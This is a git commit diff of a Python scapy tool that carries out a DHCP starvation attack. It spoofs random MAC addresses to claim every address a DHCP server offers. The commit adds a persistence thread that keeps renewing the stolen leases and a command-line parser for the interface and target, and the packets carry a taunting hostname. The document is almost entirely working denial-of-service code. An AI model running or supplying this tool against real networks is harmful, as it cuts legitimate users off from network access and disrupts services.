70f6ec630ef030719e61196469ca29ccb2b32bc2
idanmaman2 <maman@yatmal.co.il>
2022-11-06 19:51:21 +0200

    working (almost - one little bug)

--- dhcpClient.py
+++ dhcpClient.py
@@ -2,8 +2,19 @@ from scapy.all import sniff,UDP,DHCP,BOOTP,IP,Ether,RandInt,RandMAC,srp1,sendp,D
 from scapy.utils import mac2str
 import random
 from threading import Thread,get_ident 
-
 import time 
+from enum import Enum
+
+
+class DHCPStatus(Enum):
+    DISCOVER=0
+    REQUEST=1
+    MANTIN0 = 2
+    MANTAIN50=3
+    MANTAIN87=4
+    RECYCLE = 5
+    
+    
 class DHCPClient:
 	aborted = -1 
 	__onAir__=0  #mini lock to prevent more then 10 at a time 
@@ -12,26 +23,62 @@ class DHCPClient:
 	__srcPort__ = 68 
 	__BROADCASTMAC__ = "ff:ff:ff:ff:ff:ff"
 	__BROADCASTIP__ = "255.255.255.255"
-	def __init__(self) : 
+	
+ 
+	def reset():
+		DHCPClient.aborted = -1 
+		DHCPClient.__onAir__=0  #mini lock to prevent more then 10 at a time 
+		DHCPClient.__count__=0	 
+  
+	def __init__(self , iface : str  = None  , target : str = None ) : 
 		self.mac = str(RandMAC())
 		self.ip = "0.0.0.0" 
+		self.stat = DHCPStatus.DISCOVER
 		DHCPClient.__count__+=1
 		self.time=None 
+		self.curTime = None
 		self.name = DHCPClient.__count__ 
-		self.server = {
+		self.__server__ = {
 			"mac" : None,  
 			"ip" : None 
 		}
+		if not iface : 
+			iface = "eth0"
+		self.__settings__ = { 
+        "serverIp" :   target , 
+        "interface" : iface               
+        }
 
+	def to_trash(self):
+		DHCPClient.aborted = -1 
+		DHCPClient.__onAir__=0  #mini lock to prevent more then 10 at a time 
+		self.stat =  DHCPStatus(self.stat.value+1)
 
-	def __requestyou__(self,packet):
+	def re_requestyou(self):
+		Frame = Ether(src = self.mac , dst = self.__server__["mac"] ) 
+		Datagram =IP(src = self.ip , dst = self.__server__["ip"] )
+		Segment=UDP(dport= DHCPClient.__dstPort__,sport=DHCPClient.__srcPort__)
+		Bootp= BOOTP( chaddr=mac2str(self.mac) , xid = RandInt())
+		DHCPPACK =DHCP(options = [
+		('message-type','request'),
+		('hostname','hacked your server moran ;)IDHM;) '),
+		('requested_addr', self.ip),
+		'end'])
+		pack = Frame/Datagram/Segment/Bootp/DHCPPACK
+		ack = srp1(pack,iface=self.__settings__["interface"])
+		if ack : 
+				self.stat =  DHCPStatus(self.stat.value+1)
+				self.curTime = time.time()
+  
+	def __requestyou__(self,packet)->None:
+		self.stat = DHCPStatus.REQUEST
 		print(f"req:  {packet.summary()} " )
-		self.server["mac"] = packet[Ether].src
-		self.server["ip"] = packet[IP].src 
+		self.__server__["mac"] = packet[Ether].src
+		self.__server__["ip"] = packet[IP].src 
 		self.ip  = packet["IP"].dst
 		print(f"IP : {self.ip }, name : {self.name}  ,thread :  {get_ident()}")
-		Frame = Ether(src = self.mac , dst = self.server["mac"] ) 
-		Datagram =IP(src = self.ip , dst = self.server["ip"] )
+		Frame = Ether(src = self.mac , dst = self.__server__["mac"] ) 
+		Datagram =IP(src = self.ip , dst = self.__server__["ip"] )
 		Segment=UDP(dport= DHCPClient.__dstPort__,sport=DHCPClient.__srcPort__)
 		Bootp= BOOTP( chaddr=mac2str(self.mac) , xid = RandInt())
 		DHCPPACK =DHCP(options = [
@@ -41,20 +88,26 @@ class DHCPClient:
 		'end'])
 		pack = Frame/Datagram/Segment/Bootp/DHCPPACK
 		print("sending")
-		ack = srp1(pack,iface='eth0')
+		ack = srp1(pack,iface=self.__settings__["interface"])
 		optionsAck = ack[DHCP].options 
 		for i in optionsAck : 
 			if i[0] == "lease_time":
-				self.time  =time.time()  + i[1]
+				self.time  = i[1]
+				self.curTime = time.time()
+				self.stat = DHCPStatus.MANTIN0
 				break 
 		print(f"ack {self.name }  : {self.time}/ { ack.summary()}") 
 		DHCPClient.__onAir__-=1
-	def __offerme__(self):
+  
+	def __offerme__(self)->None:
 		pack = sniff(lfilter= lambda packet :
 		Ether in packet 
 		and packet[Ether].dst == self.mac 
 		and  UDP in packet 
-		and packet["UDP"].dport  == 68 ,
+		and packet["UDP"].dport  == 68 
+		and ( IP in packet and packet[IP].src == self.__settings__["serverIp"] if self.__settings__["serverIp"] else True  )
+  
+  			,
           	prn=self.__requestyou__,
           	count=1,timeout= 10 ) 
 		print(f" pack : { self.name } : {pack } : { len(pack)}  ")
@@ -63,7 +116,7 @@ class DHCPClient:
 			DHCPClient.aborted = self.name
 		print(f"offerd ended : {self.name}") 
 
-	def discover(self):  
+	def discover(self)-> Thread:  
 		'''Discovers DHCP servers and starts connection process with them  '''
 		while(DHCPClient.__onAir__ >= 10 ):
 			if(DHCPClient.aborted != -1 ) :
@@ -79,10 +132,9 @@ class DHCPClient:
 		('hostname','hacked your server moran ;)IDHM;) '),
 		'end'] )
 		pack = Frame/Datagram/Segment/Bootp/DHCPPACK
-	
 		tr = Thread(target=self.__offerme__)
 		tr.start()
-		sendp(pack,iface='eth0')
+		sendp(pack,iface=self.__settings__["interface"])
 		return tr 
 		
 
--- dhcpStarvation.py
+++ dhcpStarvation.py
@@ -1,9 +1,10 @@
-from  dhcpClient import DHCPClient
+from  dhcpClient import DHCPClient,DHCPStatus
+from  threading import Thread 
 import time 
 import sys
 
 
-def starvation( interface : str  , serverIp: str )-> None : 
+def starvation(presist : bool  ,  iface : str  , target: str )-> None : 
 	'''
 	usage: DHCPStarvationNEW.py [-h] [-p] [-i IFACE] [-t TARGET]
             DHCP Starvation
@@ -13,22 +14,77 @@ def starvation( interface : str  , serverIp: str )-> None :
 			-i IFACE, --iface IFACE Interface you wish to use
               		-t TARGET, --target TARGET IP of target server
 	'''
+ 
 	threads =[ ]
 	clients = [] 
+	def mantain (clients) :  
+		while(1):
+			for index,client in enumerate(clients): 
+				if client.time and client.stat == DHCPStatus.MANTIN0 and client.time * 0.5 <= time.time() - client.curTime  :
+					print(f"{client.stat}  client {client.name}\{client.time-time.time():.0f}\{client.ip}")
+					client.re_requestyou()
+				if client.time and client.stat == DHCPStatus.MANTAIN50 and client.time * 0.875  <=  time.time()  - client.curTime :
+					print(f"{client.stat}  client {client.name}\{client.time-time.time():.0f}\{client.ip}")
+					client.re_requestyou()
+				if client.time and client.stat == DHCPStatus.MANTAIN87 and client.time   <=  time.time()  - client.curTime :
+					
+					client.to_trash()
+					clients[index]= DHCPClient()
+					clients[index].discover()
+					print(f"""{client.stat} -> {clients[index].stat} 
+           						name {client.name} ->  { clients[index].name}
+           						mac {client.mac} ->  {clients[index].mac}		""")
+
+
+	
+
+
+
+	presistT = Thread (target = mantain ,args = (clients,)) if presist else  None
+	DHCPClient.reset() 
+	if presist : 
+		presistT.start()
 	while(DHCPClient.aborted == -1 ):
 		client = DHCPClient()
 		threads.append(client.discover())
 		clients.append(client)
-	
+
+
 	for thread in threads : 
 		if thread : 
 			thread.join()
+
 	print(f"ended starvation aborted :  {DHCPClient.aborted } " ) 
 	clients = list(filter(lambda client : client.ip != "0.0.0.0" , clients ) ) 
+	if not clients:
+		sys.exit(-1)
 	clients.sort(key=lambda client  : client.ip ) 
 	for client in clients : 
 		print(f"client {client.name}\{client.time-time.time():.0f}\{client.ip}")
+	if presist : 
+		presistT.join()
 
+ 
+	
 
-help = starvation.__doc__
-flags = {("iface" , "i") : None , ("target","t")  : None , ("persist","p")  : None }
+helpStr = starvation.__doc__
+flagsValue  = {("--iface" , "-i") : None , ("--target","-t")  : None   }
+flagsBool = {("--persist","-p")  : False} 
+index = 1
+while(index < len(sys.argv)):
+    if sys.argv[index] in ("-h","--help"):
+        print(helpStr) 
+        sys.exit(0)
+    else : 
+        for option in flagsValue : 
+            if sys.argv[index] in option :
+                index+=1 
+                if(index >= len(sys.argv)):
+                    raise Exception("need paramter  - lack of args ")
+                flagsValue[option] = sys.argv[index]
+        for option in flagsBool : 
+            if sys.argv[index] in option :
+                flagsBool[option] = True
+    index +=1
+                
+starvation(flagsBool[("--persist","-p")],*flagsValue.values())
